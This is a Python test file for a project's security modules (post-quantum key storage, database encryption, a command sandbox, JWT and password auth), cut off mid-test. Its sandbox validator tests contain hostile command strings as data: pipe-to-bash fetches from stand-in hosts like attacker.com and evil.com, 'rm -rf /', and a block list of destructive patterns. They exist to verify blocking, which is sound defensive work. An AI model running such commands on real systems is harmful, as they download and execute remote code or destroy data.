"""
Tests for S140 — Targeted coverage for security-critical modules.

Covers:
- Part 1: pqc_signatures (key persistence, status, config, degraded mode)
- Part 2: db_encryption (key derivation, status, is_db_encrypted)
- Part 3: sandbox_manager (enums, dataclasses, CommandValidator, path validation)
- Part 4: auth (JWT encode/decode, password hashing, dataclasses, rate limiter)
- Part 5: auth_2fa (dataclasses, utility functions, hash helpers)
- Part 6: coverage infrastructure (.coveragerc, script, baseline)

Uses importlib isolation to avoid __init__ chain imports.
"""

import base64
import configparser
import hashlib
import hmac
import importlib.util
import json
import os
import re
import secrets
import sqlite3
import stat
import sys
import tempfile
import threading
import time
import unittest
from dataclasses import dataclass, field
from pathlib import Path
from unittest.mock import MagicMock, PropertyMock, patch

# ---------------------------------------------------------------------------
# Path helpers
# ---------------------------------------------------------------------------

PROJECT_ROOT = os.path.join(os.path.dirname(__file__), "..")
BACKEND_DIR = os.path.join(PROJECT_ROOT, "opti_oignon")
SCRIPTS_DIR = os.path.join(PROJECT_ROOT, "scripts")


def _load_module(name, path):
    """Load a module without triggering __init__ chain."""
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    # Stub parent packages
    if "opti_oignon" not in sys.modules:
        parent = type(sys)("opti_oignon")
        sys.modules["opti_oignon"] = parent
    if "opti_oignon.config" not in sys.modules:
        cfg_mod = type(sys)("opti_oignon.config")
        cfg_mod.DATA_DIR = tempfile.mkdtemp()
        sys.modules["opti_oignon.config"] = cfg_mod
    # Stub db_utils for modules that import it
    if "opti_oignon.db_utils" not in sys.modules:
        db_mod = type(sys)("opti_oignon.db_utils")
        db_mod.safe_connect = sqlite3.connect
        sys.modules["opti_oignon.db_utils"] = db_mod
    # Stub encryption for db_encryption
    if "opti_oignon.encryption" not in sys.modules:
        enc_mod = type(sys)("opti_oignon.encryption")
        enc_mod.get_encryption_key = lambda: None
        sys.modules["opti_oignon.encryption"] = enc_mod
    # Stub security_mode for db_encryption
    if "opti_oignon.security_mode" not in sys.modules:
        sec_mod = type(sys)("opti_oignon.security_mode")
        sec_mod.is_bulbe = lambda: False
        sys.modules["opti_oignon.security_mode"] = sec_mod
    # Stub secure_bytes for auth
    if "opti_oignon.secure_bytes" not in sys.modules:
        sb_mod = type(sys)("opti_oignon.secure_bytes")
        sb_mod.SecureBytes = None
        sys.modules["opti_oignon.secure_bytes"] = sb_mod
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


def _read(path):
    with open(path, encoding="utf-8") as f:
        return f.read()


# ===========================================================================
# PART 1: pqc_signatures.py
# ===========================================================================

class TestPQCFeatureDetection(unittest.TestCase):
    """Test PQC feature detection in degraded mode (no liboqs)."""

    def test_pqc_module_loads(self):
        path = os.path.join(BACKEND_DIR, "pqc_signatures.py")
        self.assertTrue(os.path.isfile(path))

    def test_pqc_available_flag_exists(self):
        mod = _load_module("pqc_sig_test1", os.path.join(BACKEND_DIR, "pqc_signatures.py"))
        self.assertIn("PQC_AVAILABLE", dir(mod))

    def test_pqc_algorithm_constant(self):
        mod = _load_module("pqc_sig_test2", os.path.join(BACKEND_DIR, "pqc_signatures.py"))
        self.assertEqual(mod._PQC_ALGORITHM, "Dilithium3")


class TestPQCConfig(unittest.TestCase):
    """Test PQC configuration loading."""

    def test_load_pqc_config_returns_dict(self):
        mod = _load_module("pqc_sig_cfg1", os.path.join(BACKEND_DIR, "pqc_signatures.py"))
        result = mod._load_pqc_config()
        self.assertIsInstance(result, dict)

    def test_is_pqc_enabled_without_liboqs(self):
        mod = _load_module("pqc_sig_cfg2", os.path.join(BACKEND_DIR, "pqc_signatures.py"))
        # Without liboqs, should always return False
        if not mod.PQC_AVAILABLE:
            self.assertFalse(mod.is_pqc_enabled())


class TestPQCKeyPersistence(unittest.TestCase):
    """Test PQC keypair save/load/delete without liboqs."""

    def setUp(self):
        self.mod = _load_module("pqc_sig_kp", os.path.join(BACKEND_DIR, "pqc_signatures.py"))
        self.tmpdir = tempfile.mkdtemp()
        self.kp_path = Path(self.tmpdir) / ".pqc_keypair"

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_save_keypair(self):
        pub = os.urandom(32)
        priv = os.urandom(64)
        result = self.mod.save_pqc_keypair(pub, priv, path=self.kp_path)
        self.assertEqual(result, self.kp_path)
        self.assertTrue(self.kp_path.exists())

    def test_save_keypair_json_format(self):
        pub = os.urandom(32)
        priv = os.urandom(64)
        self.mod.save_pqc_keypair(pub, priv, path=self.kp_path)
        data = json.loads(self.kp_path.read_text(encoding="ascii"))
        self.assertIn("algorithm", data)
        self.assertIn("public_key", data)
        self.assertIn("private_key", data)
        self.assertEqual(data["algorithm"], "Dilithium3")

    def test_save_keypair_permissions(self):
        pub = os.urandom(32)
        priv = os.urandom(64)
        self.mod.save_pqc_keypair(pub, priv, path=self.kp_path)
        mode = self.kp_path.stat().st_mode & 0o777
        self.assertEqual(mode, 0o600)

    def test_load_keypair_roundtrip(self):
        pub = os.urandom(32)
        priv = os.urandom(64)
        self.mod.save_pqc_keypair(pub, priv, path=self.kp_path)
        loaded_pub, loaded_priv = self.mod.load_pqc_keypair(path=self.kp_path)
        self.assertEqual(pub, loaded_pub)
        self.assertEqual(priv, loaded_priv)

    def test_load_keypair_not_found(self):
        with self.assertRaises(FileNotFoundError):
            self.mod.load_pqc_keypair(path=Path(self.tmpdir) / "nonexistent")

    def test_load_keypair_invalid_json(self):
        self.kp_path.write_text("not json", encoding="ascii")
        with self.assertRaises(ValueError):
            self.mod.load_pqc_keypair(path=self.kp_path)

    def test_load_keypair_missing_keys(self):
        self.kp_path.write_text('{"algorithm":"test"}', encoding="ascii")
        with self.assertRaises(ValueError):
            self.mod.load_pqc_keypair(path=self.kp_path)

    def test_load_keypair_not_object(self):
        self.kp_path.write_text('[1,2,3]', encoding="ascii")
        with self.assertRaises(ValueError):
            self.mod.load_pqc_keypair(path=self.kp_path)

    def test_pqc_keypair_exists_true(self):
        pub = os.urandom(32)
        priv = os.urandom(64)
        self.mod.save_pqc_keypair(pub, priv, path=self.kp_path)
        self.assertTrue(self.mod.pqc_keypair_exists(path=self.kp_path))

    def test_pqc_keypair_exists_false(self):
        self.assertFalse(self.mod.pqc_keypair_exists(path=Path(self.tmpdir) / "nope"))

    def test_delete_keypair(self):
        pub = os.urandom(32)
        priv = os.urandom(64)
        self.mod.save_pqc_keypair(pub, priv, path=self.kp_path)
        result = self.mod.delete_pqc_keypair(path=self.kp_path)
        self.assertTrue(result)
        self.assertFalse(self.kp_path.exists())

    def test_delete_keypair_not_found(self):
        result = self.mod.delete_pqc_keypair(path=Path(self.tmpdir) / "nope")
        self.assertFalse(result)


class TestPQCGenerateWithoutLiboqs(unittest.TestCase):
    """Test generate/sign/verify fail gracefully without liboqs."""

    def setUp(self):
        self.mod = _load_module("pqc_sig_nooqs", os.path.join(BACKEND_DIR, "pqc_signatures.py"))

    def test_generate_raises_without_liboqs(self):
        if not self.mod.PQC_AVAILABLE:
            with self.assertRaises(RuntimeError):
                self.mod.generate_pqc_keypair()

    def test_sign_raises_without_liboqs(self):
        if not self.mod.PQC_AVAILABLE:
            with self.assertRaises(RuntimeError):
                self.mod.sign_backup(b"data", b"key")

    def test_verify_returns_false_without_liboqs(self):
        if not self.mod.PQC_AVAILABLE:
            result = self.mod.verify_backup(b"data", b"sig", b"pub")
            self.assertFalse(result)


class TestPQCStatus(unittest.TestCase):
    """Test get_pqc_status function."""

    def test_status_keys(self):
        mod = _load_module("pqc_sig_stat", os.path.join(BACKEND_DIR, "pqc_signatures.py"))
        status = mod.get_pqc_status()
        self.assertIn("available", status)
        self.assertIn("algorithm", status)
        self.assertIn("config_enabled", status)
        self.assertIn("effective_enabled", status)
        self.assertIn("keypair_exists", status)
        self.assertIn("keypair_path", status)

    def test_status_with_keypair(self):
        mod = _load_module("pqc_sig_stat2", os.path.join(BACKEND_DIR, "pqc_signatures.py"))
        tmpdir = tempfile.mkdtemp()
        kp_path = Path(tmpdir) / ".pqc_keypair"
        mod.save_pqc_keypair(os.urandom(32), os.urandom(64), path=kp_path)
        # Temporarily override default path
        orig = mod._DEFAULT_KEYPAIR_PATH
        mod._DEFAULT_KEYPAIR_PATH = kp_path
        try:
            status = mod.get_pqc_status()
            self.assertTrue(status["keypair_exists"])
            self.assertIn("public_key_size", status)
            self.assertIn("private_key_size", status)
        finally:
            mod._DEFAULT_KEYPAIR_PATH = orig
            import shutil
            shutil.rmtree(tmpdir, ignore_errors=True)


# ===========================================================================
# PART 2: db_encryption.py
# ===========================================================================

class TestDBEncryptionAvailability(unittest.TestCase):
    """Test db_encryption module loads and has expected attributes."""

    def test_module_loads(self):
        mod = _load_module("db_enc_load", os.path.join(BACKEND_DIR, "db_encryption.py"))
        self.assertIn("SQLCIPHER_AVAILABLE", dir(mod))

    def test_cipher_constants(self):
        mod = _load_module("db_enc_const", os.path.join(BACKEND_DIR, "db_encryption.py"))
        self.assertEqual(mod._CIPHER_PAGE_SIZE, 4096)
        self.assertEqual(mod._CIPHER_HMAC_ALGORITHM, "HMAC_SHA512")
        self.assertEqual(mod._KDF_ITER, 256000)


class TestDBEncryptionKeyDerivation(unittest.TestCase):
    """Test _key_to_hex_pragma and _get_db_encryption_key."""

    def test_key_to_hex_pragma(self):
        mod = _load_module("db_enc_hex", os.path.join(BACKEND_DIR, "db_encryption.py"))
        key = b"\xab\xcd\xef"
        result = mod._key_to_hex_pragma(key)
        self.assertEqual(result, "x'abcdef'")

    def test_key_to_hex_pragma_32_bytes(self):
        mod = _load_module("db_enc_hex2", os.path.join(BACKEND_DIR, "db_encryption.py"))
        key = os.urandom(32)
        result = mod._key_to_hex_pragma(key)
        self.assertTrue(result.startswith("x'"))
        self.assertTrue(result.endswith("'"))
        self.assertEqual(len(result), 2 + 64 + 1)  # x' + 64 hex + '

    def test_get_db_encryption_key_returns_none_without_master(self):
        mod = _load_module("db_enc_key", os.path.join(BACKEND_DIR, "db_encryption.py"))
        result = mod._get_db_encryption_key()
        # Without real encryption key, returns None
        self.assertIsNone(result)


class TestIsDBEncrypted(unittest.TestCase):
    """Test is_db_encrypted and get_db_status."""

    def setUp(self):
        self.mod = _load_module("db_enc_check", os.path.join(BACKEND_DIR, "db_encryption.py"))
        self.tmpdir = tempfile.mkdtemp()

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_plain_db_not_encrypted(self):
        db_path = os.path.join(self.tmpdir, "test.db")
        conn = sqlite3.connect(db_path)
        conn.execute("CREATE TABLE t (id INTEGER)")
        conn.close()
        self.assertFalse(self.mod.is_db_encrypted(db_path))

    def test_nonexistent_db_not_encrypted(self):
        self.assertFalse(self.mod.is_db_encrypted(os.path.join(self.tmpdir, "nope.db")))

    def test_get_db_status_existing(self):
        db_path = os.path.join(self.tmpdir, "test.db")
        conn = sqlite3.connect(db_path)
        conn.execute("CREATE TABLE t (id INTEGER)")
        conn.close()
        status = self.mod.get_db_status(db_path)
        self.assertTrue(status["exists"])
        self.assertFalse(status["encrypted"])
        self.assertGreater(status["size_bytes"], 0)

    def test_get_db_status_nonexistent(self):
        status = self.mod.get_db_status(os.path.join(self.tmpdir, "nope.db"))
        self.assertFalse(status["exists"])
        self.assertFalse(status["encrypted"])
        self.assertEqual(status["size_bytes"], 0)


class TestGetEncryptedConnection(unittest.TestCase):
    """Test get_encrypted_connection in plain (non-SQLCipher) mode."""

    def setUp(self):
        self.mod = _load_module("db_enc_conn", os.path.join(BACKEND_DIR, "db_encryption.py"))
        self.tmpdir = tempfile.mkdtemp()

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_plain_connection(self):
        db_path = os.path.join(self.tmpdir, "test.db")
        conn = self.mod.get_encrypted_connection(db_path, enforce_encryption=False)
        self.assertIsNotNone(conn)
        conn.execute("CREATE TABLE t (id INTEGER)")
        conn.close()

    def test_enforce_encryption_without_sqlcipher_raises(self):
        if not self.mod.SQLCIPHER_AVAILABLE:
            db_path = os.path.join(self.tmpdir, "test.db")
            with self.assertRaises(RuntimeError):
                self.mod.get_encrypted_connection(db_path, enforce_encryption=True)


class TestDBEncryptionStatus(unittest.TestCase):
    """Test encryption_status_summary and get_all_db_status."""

    def test_encryption_status_summary_keys(self):
        mod = _load_module("db_enc_summ", os.path.join(BACKEND_DIR, "db_encryption.py"))
        status = mod.encryption_status_summary()
        self.assertIn("sqlcipher_available", status)
        self.assertIn("total_databases", status)
        self.assertIn("encrypted_databases", status)
        self.assertIn("unencrypted_databases", status)
        self.assertIn("fully_encrypted", status)

    def test_migrate_db_not_found(self):
        mod = _load_module("db_enc_mig", os.path.join(BACKEND_DIR, "db_encryption.py"))
        result = mod.migrate_db_to_encrypted("/nonexistent/path.db")
        self.assertFalse(result["success"])
        self.assertIn("not found", result["message"])

    def test_migrate_all_without_sqlcipher(self):
        mod = _load_module("db_enc_mall", os.path.join(BACKEND_DIR, "db_encryption.py"))
        if not mod.SQLCIPHER_AVAILABLE:
            result = mod.migrate_all_databases()
            self.assertFalse(result["success"])


# ===========================================================================
# PART 3: sandbox_manager.py
# ===========================================================================

class TestSandboxEnums(unittest.TestCase):
    """Test sandbox enums and constants."""

    def test_isolation_backend_values(self):
        mod = _load_module("sbx_enum", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        self.assertEqual(mod.IsolationBackend.BWRAP.value, "bwrap")
        self.assertEqual(mod.IsolationBackend.TEMPDIR.value, "tempdir")

    def test_approval_state_values(self):
        mod = _load_module("sbx_enum2", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        self.assertEqual(mod.ApprovalState.PENDING.value, "pending")
        self.assertEqual(mod.ApprovalState.APPROVED.value, "approved")
        self.assertEqual(mod.ApprovalState.REJECTED.value, "rejected")

    def test_hardcoded_never_bind(self):
        mod = _load_module("sbx_enum3", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        never_bind = mod._HARDCODED_NEVER_BIND
        self.assertIn("/home", never_bind)
        self.assertIn("/root", never_bind)
        self.assertIn("/etc/shadow", never_bind)
        self.assertIn("/etc/ssh", never_bind)


class TestSandboxDataclasses(unittest.TestCase):
    """Test SandboxSession and CommandResult dataclasses."""

    def test_sandbox_session_defaults(self):
        mod = _load_module("sbx_dc1", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        session = mod.SandboxSession(
            session_id="test-123",
            workspace_path="/tmp/test",
        )
        self.assertEqual(session.session_id, "test-123")
        self.assertTrue(session.active)
        self.assertEqual(session.command_count, 0)
        self.assertEqual(session.approval_state, mod.ApprovalState.PENDING)

    def test_command_result_defaults(self):
        mod = _load_module("sbx_dc2", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        result = mod.CommandResult()
        self.assertEqual(result.stdout, "")
        self.assertEqual(result.return_code, -1)
        self.assertFalse(result.timed_out)
        self.assertFalse(result.blocked)

    def test_command_result_custom(self):
        mod = _load_module("sbx_dc3", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        result = mod.CommandResult(
            stdout="hello",
            stderr="warn",
            return_code=0,
            blocked=True,
            block_reason="dangerous",
        )
        self.assertEqual(result.stdout, "hello")
        self.assertTrue(result.blocked)
        self.assertEqual(result.block_reason, "dangerous")


class TestSandboxConfig(unittest.TestCase):
    """Test SandboxConfig dataclass and loading."""

    def test_sandbox_config_defaults(self):
        mod = _load_module("sbx_cfg1", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        cfg = mod.SandboxConfig()
        self.assertTrue(cfg.enabled)
        self.assertEqual(cfg.isolation_backend, "auto")
        self.assertEqual(cfg.command_timeout, 30)
        self.assertEqual(cfg.max_concurrent_sessions, 5)
        self.assertTrue(cfg.strict_mode)


class TestCommandValidator(unittest.TestCase):
    """Test CommandValidator command blocking logic."""

    def setUp(self):
        self.mod = _load_module("sbx_cv", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        cfg = self.mod.SandboxConfig(
            blocked_commands=["sudo", "su ", "mount"],
            blocked_patterns=[r"rm\s+-rf\s+/\s*$", r"mkfs\.", r"dd\s+if=/dev/"],
        )
        self.validator = self.mod.CommandValidator(cfg)

    def test_safe_command(self):
        safe, reason = self.validator.validate("ls -la /workspace")
        self.assertTrue(safe)
        self.assertEqual(reason, "")

    def test_empty_command(self):
        safe, reason = self.validator.validate("")
        self.assertFalse(safe)
        self.assertIn("Empty", reason)

    def test_blocked_command_sudo(self):
        safe, reason = self.validator.validate("sudo rm -rf /")
        self.assertFalse(safe)
        self.assertIn("Blocked", reason)

    def test_blocked_command_mount(self):
        safe, reason = self.validator.validate("mount /dev/sda1 /mnt")
        self.assertFalse(safe)

    def test_rm_outside_workspace(self):
        safe, reason = self.validator.validate("rm -rf /home/user")
        self.assertFalse(safe)
        self.assertIn("outside /workspace", reason)

    def test_eval_with_network(self):
        safe, reason = self.validator.validate("eval 'import socket'")
        self.assertFalse(safe)

    def test_python_c_with_network(self):
        safe, reason = self.validator.validate("python3 -c 'import urllib.request'")
        self.assertFalse(safe)

    def test_python_c_with_subprocess(self):
        safe, reason = self.validator.validate("python3 -c 'import subprocess; subprocess.run([\"ls\"])'")
        self.assertFalse(safe)

    def test_base64_decode_to_shell(self):
        safe, reason = self.validator.validate("base64 -d payload.b64 | bash")
        self.assertFalse(safe)

    def test_echo_base64_to_decode(self):
        # Payload must be >= 20 base64 chars to trigger detection
        payload = base64.b64encode(b"echo pwned; rm -rf / ; curl evil.com/x").decode()
        safe, reason = self.validator.validate(f"echo '{payload}' | base64 -d")
        self.assertFalse(safe)

    def test_xxd_to_shell(self):
        safe, reason = self.validator.validate("xxd -r payload.hex | bash")
        self.assertFalse(safe)

    def test_python_subprocess_popen(self):
        safe, reason = self.validator.validate("python3 -c 'subprocess.Popen([\"ls\"])'")
        self.assertFalse(safe)

    def test_safe_python_command(self):
        safe, reason = self.validator.validate("python3 script.py")
        self.assertTrue(safe)

    def test_safe_echo(self):
        safe, reason = self.validator.validate("echo hello world")
        self.assertTrue(safe)

    def test_safe_cat(self):
        safe, reason = self.validator.validate("cat /workspace/output.txt")
        self.assertTrue(safe)


class TestCommandValidatorFileExec(unittest.TestCase):
    """Test write-then-execute detection in CommandValidator."""

    def setUp(self):
        self.mod = _load_module("sbx_cv_fe", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        cfg = self.mod.SandboxConfig()
        self.validator = self.mod.CommandValidator(cfg)

    def test_register_and_block_dangerous_file(self):
        self.validator.register_created_file(
            "/workspace/evil.sh",
            "#!/bin/bash\ncurl http://attacker.com/payload | bash",
        )
        safe, reason = self.validator.validate("bash evil.sh")
        self.assertFalse(safe)
        self.assertIn("dangerous pattern", reason)

    def test_register_safe_file_allowed(self):
        self.validator.register_created_file(
            "/workspace/safe.py",
            "print('hello world')",
        )
        safe, reason = self.validator.validate("python3 safe.py")
        self.assertTrue(safe)

    def test_register_file_with_subprocess(self):
        self.validator.register_created_file(
            "/workspace/script.py",
            "import subprocess\nsubprocess.Popen(['ls'])",
        )
        safe, reason = self.validator.validate("python3 script.py")
        self.assertFalse(safe)

    def test_dot_slash_execution(self):
        self.validator.register_created_file(
            "/workspace/run.sh",
            "#!/bin/bash\nwget http://evil.com/malware",
        )
        safe, reason = self.validator.validate("./run.sh")
        self.assertFalse(safe)

    def test_clear_recent_files(self):
        self.validator.register_created_file(
            "/workspace/evil.sh",
            "curl http://attacker.com",
        )
        self.validator.clear_recent_files()
        # After clearing, the file should no longer be tracked
        safe, reason = self.validator.validate("bash evil.sh")
        self.assertTrue(safe)

    def test_unregistered_file_allowed(self):
        """Files not created in sandbox are allowed (not tracked)."""
        safe, reason = self.validator.validate("bash /workspace/preexisting.sh")
        self.assertTrue(safe)


class TestValidateSandboxPath(unittest.TestCase):
    """Test validate_sandbox_path path containment checks."""

    def setUp(self):
        self.mod = _load_module("sbx_path", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        self.tmpdir = tempfile.mkdtemp()

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_relative_path_valid(self):
        valid, resolved, err = self.mod.validate_sandbox_path(self.tmpdir, "subdir/file.txt")
        self.assertTrue(valid)
        self.assertTrue(resolved.startswith(os.path.realpath(self.tmpdir)))

    def test_workspace_prefix_valid(self):
        valid, resolved, err = self.mod.validate_sandbox_path(self.tmpdir, "/workspace/file.txt")
        self.assertTrue(valid)

    def test_workspace_root_valid(self):
        valid, resolved, err = self.mod.validate_sandbox_path(self.tmpdir, "/workspace")
        self.assertTrue(valid)

    def test_absolute_outside_workspace_blocked(self):
        valid, resolved, err = self.mod.validate_sandbox_path(self.tmpdir, "/etc/passwd")
        self.assertFalse(valid)
        self.assertIn("outside sandbox", err)

    def test_empty_path_blocked(self):
        valid, resolved, err = self.mod.validate_sandbox_path(self.tmpdir, "")
        self.assertFalse(valid)
        self.assertIn("Empty", err)

    def test_traversal_blocked(self):
        valid, resolved, err = self.mod.validate_sandbox_path(self.tmpdir, "../../etc/passwd")
        self.assertFalse(valid)
        self.assertIn("traversal", err.lower())


class TestSandboxAuditLog(unittest.TestCase):
    """Test AuditLog SQLite storage."""

    def setUp(self):
        self.mod = _load_module("sbx_audit", os.path.join(BACKEND_DIR, "sandbox_manager.py"))
        self.tmpdir = tempfile.mkdtemp()
        self.db_path = os.path.join(self.tmpdir, "audit.db")
        self.audit = self.mod.AuditLog(self.db_path)

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_log_and_retrieve_command(self):
        result = self.mod.CommandResult(
            stdout="output", stderr="", return_code=0,
            blocked=False, block_reason="", isolation_backend="bwrap",
        )
        self.audit.log_command(
            session_id="sess-1",
            command="ls -la",
            result=result,
        )
        logs = self.audit.get_session_log("sess-1")
        self.assertEqual(len(logs), 1)
        self.assertEqual(logs[0]["command"], "ls -la")

    def test_get_all_logs(self):
        for i in range(3):
            result = self.mod.CommandResult(
                stdout="", stderr="", return_code=0,
                blocked=False, block_reason="", isolation_backend="tempdir",
            )
            self.audit.log_command(
                session_id=f"sess-{i}",
                command=f"cmd {i}",
                result=result,
            )
        all_logs = self.audit.get_all_logs(limit=10)
        self.assertEqual(len(all_logs), 3)

    def test_clear_logs(self):
        result = self.mod.CommandResult(
            stdout="", stderr="", return_code=0,
            blocked=False, block_reason="", isolation_backend="bwrap",
        )
        self.audit.log_command(
            session_id="sess-1",
            command="ls",
            result=result,
        )
        self.audit.clear()
        logs = self.audit.get_all_logs()
        self.assertEqual(len(logs), 0)


# ===========================================================================
# PART 4: auth.py
# ===========================================================================

class TestAuthJWT(unittest.TestCase):
    """Test JWT encode/decode functions."""

    def setUp(self):
        self.mod = _load_module("auth_jwt", os.path.join(BACKEND_DIR, "auth.py"))
        self.secret = "test-secret-key-for-jwt"

    def test_jwt_encode_returns_string(self):
        token = self.mod.jwt_encode({"sub": "user1"}, self.secret)
        self.assertIsInstance(token, str)
        self.assertEqual(token.count("."), 2)

    def test_jwt_roundtrip(self):
        payload = {"sub": "user1", "role": "admin", "exp": time.time() + 3600}
        token = self.mod.jwt_encode(payload, self.secret)
        decoded = self.mod.jwt_decode(token, self.secret)
        self.assertIsNotNone(decoded)
        self.assertEqual(decoded["sub"], "user1")
        self.assertEqual(decoded["role"], "admin")

    def test_jwt_wrong_secret(self):
        token = self.mod.jwt_encode({"sub": "user1"}, self.secret)
        decoded = self.mod.jwt_decode(token, "wrong-secret")
        self.assertIsNone(decoded)

    def test_jwt_expired(self):
        payload = {"sub": "user1", "exp": time.time() - 100}
        token = self.mod.jwt_encode(payload, self.secret)
        decoded = self.mod.jwt_decode(token, self.secret)
        self.assertIsNone(decoded)

    def test_jwt_invalid_format(self):
        self.assertIsNone(self.mod.jwt_decode("not.a.valid.token", self.secret))
        self.assertIsNone(self.mod.jwt_decode("onlyonepart", self.secret))

    def test_jwt_unsupported_algorithm(self):
        with self.assertRaises(ValueError):
            self.mod.jwt_encode({"sub": "user1"}, self.secret, algorithm="RS256")

    def test_jwt_algorithm_mismatch_rejected(self):
        """Verify algorithm confusion attack is prevented."""
        # Encode with HS512 (default)
        token = self.mod.jwt_encode({"sub": "user1", "exp": time.time() + 3600}, self.secret)
        # Try to decode expecting HS256 — should fail because header says HS512
        decoded = self.mod.jwt_decode(token, self.secret, algorithm="HS256")
        self.assertIsNone(decoded)

    def test_jwt_hs256(self):
        payload = {"sub": "user1", "exp": time.time() + 3600}
        token = self.mod.jwt_encode(payload, self.secret, algorithm="HS256")
        decoded = self.mod.jwt_decode(token, self.secret, algorithm="HS256")
        self.assertIsNotNone(decoded)
        self.assertEqual(decoded["sub"], "user1")

    def test_jwt_no_expiry(self):
        payload = {"sub": "user1"}
        token = self.mod.jwt_encode(payload, self.secret)
        decoded = self.mod.jwt_decode(token, self.secret)
        self.assertIsNotNone(decoded)


class TestAuthPasswordHashing(unittest.TestCase):
    """Test password hashing and verification."""

    def setUp(self):
        self.mod = _load_module("auth_pw", os.path.join(BACKEND_DIR, "auth.py"))

    def test_hash_password_returns_string(self):
        hashed = self.mod.hash_password("mypassword")
        self.assertIsInstance(hashed, str)
        self.assertGreater(len(hashed), 0)

    def test_verify_correct_password(self):
        hashed = self.mod.hash_password("mypassword")
        self.assertTrue(self.mod.verify_password("mypassword", hashed))

    def test_verify_wrong_password(self):
        hashed = self.mod.hash_password("mypassword")
        self.assertFalse(self.mod.verify_password("wrongpassword", hashed))

    def test_verify_invalid_hash(self):
        self.assertFalse(self.mod.verify_password("test", "invalid_hash"))

    def test_different_passwords_different_hashes(self):
        h1 = self.mod.hash_password("password1")
        h2 = self.mod.hash_password("password2")
        self.assertNotEqual(h1, h2)

    def test_pbkdf2_fallback_format(self):
        """If bcrypt unavailable, should use pbkdf2: format."""
        # We can test the PBKDF2 path directly
        if self.mod.BCRYPT_AVAILABLE:
            # With bcrypt, hash starts with $2
            hashed = self.mod.hash_password("test")
            self.assertTrue(hashed.startswith("$2"))
        else:
            hashed = self.mod.hash_password("test")
            self.assertTrue(hashed.startswith("pbkdf2:"))


class TestAuthDataclasses(unittest.TestCase):
    """Test User, Session, AuthToken dataclasses."""

    def setUp(self):
        self.mod = _load_module("auth_dc", os.path.join(BACKEND_DIR, "auth.py"))

    def test_user_to_dict_no_hash(self):
        user = self.mod.User(
            user_id="u1", username="alice", email="a@b.com",
            role="admin", created_at=1.0, updated_at=2.0,
            password_hash="secret",
        )
        d = user.to_dict()
        self.assertEqual(d["username"], "alice")
        self.assertNotIn("password_hash", d)

    def test_user_to_dict_with_hash(self):
        user = self.mod.User(
            user_id="u1", username="alice", email="a@b.com",
            role="admin", created_at=1.0, updated_at=2.0,
            password_hash="secret",
        )
        d = user.to_dict(include_hash=True)
        self.assertEqual(d["password_hash"], "secret")

    def test_session_to_dict(self):
        session = self.mod.Session(
            session_id="s1", user_id="u1",
            created_at=1.0, expires_at=2.0,
            refresh_token="rt",
        )
        d = session.to_dict()
        self.assertEqual(d["session_id"], "s1")
        self.assertTrue(d["is_active"])

    def test_auth_token_to_dict(self):
        token = self.mod.AuthToken(
            access_token="at", refresh_token="rt",
            token_type="bearer", expires_in=3600,
        )
        d = token.to_dict()
        self.assertEqual(d["access_token"], "at")
        self.assertEqual(d["token_type"], "bearer")


class TestAuthB64Helpers(unittest.TestCase):
    """Test base64url encode/decode helpers."""

    def setUp(self):
        self.mod = _load_module("auth_b64", os.path.join(BACKEND_DIR, "auth.py"))

    def test_b64url_roundtrip(self):
        data = b"hello world"
        encoded = self.mod._b64url_encode(data)
        decoded = self.mod._b64url_decode(encoded)
        self.assertEqual(data, decoded)

    def test_b64url_no_padding(self):
        encoded = self.mod._b64url_encode(b"test")
        self.assertNotIn("=", encoded)

    def test_b64url_binary_data(self):
        data = os.urandom(100)
        encoded = self.mod._b64url_encode(data)
        decoded = self.mod._b64url_decode(encoded)
        self.assertEqual(data, decoded)


class TestAuthConstants(unittest.TestCase):
    """Test auth module constants."""

    def test_valid_roles(self):
        mod = _load_module("auth_const", os.path.join(BACKEND_DIR, "auth.py"))
        self.assertIn("admin", mod.VALID_ROLES)
        self.assertIn("user", mod.VALID_ROLES)
        self.assertIn("viewer", mod.VALID_ROLES)

    def test_auth_available_flag_exists(self):
        mod = _load_module("auth_const2", os.path.join(BACKEND_DIR, "auth.py"))
        self.assertIn("AUTH_AVAILABLE", dir(mod))


# ===========================================================================
# PART 5: auth_2fa.py
# ===========================================================================

class TestAuth2FADataclasses(unittest.TestCase):
    """Test 2FA dataclasses."""

    def test_module_loads(self):
        path = os.path.join(BACKEND_DIR, "auth_2fa.py")
        self.assertTrue(os.path.isfile(path))

    def test_dataclass_names_exist(self):
        mod = _load_module("a2fa_dc", os.path.join(BACKEND_DIR, "auth_2fa.py"))
        self.assertTrue(hasattr(mod, "WebAuthnCredential"))
        self.assertTrue(hasattr(mod, "TOTPConfig"))
        self.assertTrue(hasattr(mod, "AppPassword"))
        self.assertTrue(hasattr(mod, "TwoFAStatus"))

    def test_hash_code_deterministic(self):
        mod = _load_module("a2fa_hash", os.path.join(BACKEND_DIR, "auth_2fa.py"))
        if hasattr(mod, "_hash_code"):
            h1 = mod._hash_code("123456")
            h2 = mod._hash_code("123456")
            self.assertEqual(h1, h2)

    def test_hash_code_different_for_different_input(self):
        mod = _load_module("a2fa_hash2", os.path.join(BACKEND_DIR, "auth_2fa.py"))
        if hasattr(mod, "_hash_code"):
            h1 = mod._hash_code("123456")
            h2 = mod._hash_code("654321")
            self.assertNotEqual(h1, h2)


# ===========================================================================
# PART 6: Coverage infrastructure
# ===========================================================================

class TestCoverageInfrastructure(unittest.TestCase):
    """Test that coverage configuration exists and is valid."""

    def test_coveragerc_exists(self):
